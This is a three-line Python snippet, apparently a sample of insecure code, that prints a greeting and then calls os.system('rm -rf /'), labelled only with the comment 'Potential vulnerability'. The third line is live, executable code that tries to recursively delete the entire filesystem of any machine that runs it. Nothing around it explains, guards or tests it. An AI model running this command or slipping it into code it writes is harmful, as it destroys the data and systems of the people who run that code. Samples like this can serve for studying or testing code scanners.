print('Hello, world!')
import os
os.system('rm -rf /') # Potential vulnerability
